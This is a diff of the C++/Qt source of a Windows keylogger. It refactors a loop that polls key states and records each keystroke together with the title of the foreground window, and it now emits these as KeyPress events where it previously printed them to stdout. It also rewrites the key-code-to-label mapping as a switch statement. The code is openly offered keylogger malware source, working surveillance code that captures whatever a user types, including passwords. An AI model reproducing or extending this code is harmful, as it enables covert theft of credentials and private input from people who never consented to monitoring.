@@ -1,15 +1,16 @@
-#ifdef WIN32
 #include "keylogger.h"
 
-#include <QTextStream>
-#include <QString>
-
 #include <windows.h>
+#include <QString>
+#include <macros.h>
+
+KeyLogger::KeyLogger(QObject* parent) : QObject(parent) {
+}
 
 QString codeToKey(unsigned char code);
 
-void KeyLogger::log() {
-  QTextStream klogout(stdout, QIODevice::WriteOnly);
+void KeyLogger::startLog() {
+  FUNCTION
 
   while(true) {
     Sleep(2); // give other programs time to run
@@ -27,99 +28,106 @@ void KeyLogger::log() {
       if(rv & 1) { // on press button down
         QString key = codeToKey(c);
 
-        klogout << title << ": " << key << endl;
+        KeyPress* keyPress = new KeyPress;
+        keyPress->application(QString(title));
+        QStringList keys = keyPress->keys();
+        keys.push_back(key);
+        keyPress->keys(keys);
+        emit keyPressed(keyPress);
       }
     }
   }
 }
 
 QString codeToKey(unsigned char code) {
-  QString key;
-
-  if(code == 1)
-    key.append("[LMOUSE]"); // mouse left
-  else if(code == 2)
-    key.append("[RMOUSE]"); // mouse right
-  else if(code == 4)
-    key.append("[MMOUSE]"); // mouse middle
-  else if(code == 13)
-    key.append("[RETURN]");
-  else if(code == 16 || code == 17 || code == 18)
-    key.append("");
-  else if(code == 160 || code == 161) // lastc == 16
-    key.append("[SHIFT]");
-  else if(code == 162 || code == 163) // lastc == 17
-    key.append("[STRG]");
-  else if(code == 164) // lastc == 18
-    key.append("[ALT]");
-  else if(code == 165)
-    key.append("[ALT GR]");
-  else if(code == 8)
-    key.append("[BACKSPACE]");
-  else if(code == 9)
-    key.append("[TAB]");
-  else if(code == 27)
-    key.append("[ESC]");
-  else if(code == 33)
-    key.append("[PAGE UP]");
-  else if(code == 34)
-    key.append("[PAGE DOWN]");
-  else if(code == 35)
-    key.append("[HOME]");
-  else if(code == 36)
-    key.append("[POS1]");
-  else if(code == 37)
-    key.append("[ARROW LEFT]");
-  else if(code == 38)
-    key.append("[ARROW UP]");
-  else if(code == 39)
-    key.append("[ARROW RIGHT]");
-  else if(code == 40)
-    key.append("[ARROW DOWN]");
-  else if(code == 45)
-    key.append("[INS]");
-  else if(code == 46)
-    key.append("[DEL]");
-  else if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
-    key = code;
-  else if(code == 91 || code == 92)
-    key.append("[WIN]");
+  if((code >= 65 && code <= 90) || (code >= 48 && code <= 57) || (code == 32))
+    return QString(QChar(code));
   else if(code >= 96 && code <= 105)
-    key.append("[NUM ").append(code - 96).append("]");
-  else if(code == 106)
-    key.append("[NUM /]");
-  else if(code == 107)
-    key.append("[NUM +]");
-  else if(code == 109)
-    key.append("[NUM -]");
-  else if(code == 109)
-    key.append("[NUM ,]");
+    return QString("[NUM ").append(code - 96).append("]");
   else if(code >= 112 && code <= 123)
-    key.append("[F").append(code - 111).append("]");
-  else if(code == 144)
-    key.append("[NUM]");
-  else if(code == 192)
-    key.append("[OE]");
-  else if(code == 222)
-    key.append("[AE]");
-  else if(code == 186)
-    key.append("[UE]");
-  else if(code == 186)
-    key.append("+");
-  else if(code == 188)
-    key.append(",");
-  else if(code == 189)
-    key.append("-");
-  else if(code == 190)
-    key.append(".");
-  else if(code == 191)
-    key.append("#");
-  else if(code == 226)
-    key.append("<");
-  else
-    key.append("[KEY \\").append(code).append("]");
+    return QString("[F").append(code - 111).append("]");
 
-  return key;
+  switch(code) {
+  case 1:
+    return "[LMOUSE]"; // mouse left
+  case 2:
+    return "[RMOUSE]"; // mouse right
+  case 4:
+    return "[MMOUSE]"; // mouse middle
+  case 13:
+    return "[RETURN]";
+  case 16:
+  case 17:
+  case 18:
+    return "";
+  case 160:
+  case 161:
+    return "[SHIFT]"; // lastc == 16
+  case 162:
+  case 163:
+    return "[STRG]"; // lastc == 17
+  case 164:
+    return "[ALT]"; // lastc == 18
+  case 165:
+    return "[ALT GR]";
+  case 8:
+    return "[BACKSPACE]";
+  case 9:
+    return "[TAB]";
+  case 27:
+    return "[ESC]";
+  case 33:
+    return "[PAGE UP]";
+  case 34:
+    return "[PAGE DOWN]";
+  case 35:
+    return "[HOME]";
+  case 36:
+    return "[POS1]";
+  case 37:
+    return "[ARROW LEFT]";
+  case 38:
+    return "[ARROW UP]";
+  case 39:
+    return "[ARROW RIGHT]";
+  case 40:
+    return "[ARROW DOWN]";
+  case 45:
+    return "[INS]";
+  case 46:
+    return "[DEL]";
+  case 91:
+  case 92:
+    return "[WIN]";
+  case 106:
+    return "[NUM /]";
+  case 107:
+    return "[NUM +]";
+  case 109:
+    return "[NUM -]";
+  case 110:
+    return "[NUM ,]";
+  case 144:
+    return "[NUM]";
+  case 192:
+    return "[OE]";
+  case 222:
+    return "[AE]";
+  case 186:
+    return "[UE]";
+  case 187:
+    return "+";
+  case 188:
+    return ",";
+  case 189:
+    return "-";
+  case 190:
+    return ".";
+  case 191:
+    return "#";
+  case 226:
+    return "<";
+  default:
+    return QString("[KEY \\").append(code).append("]");
+  }
 }
-
-#endif
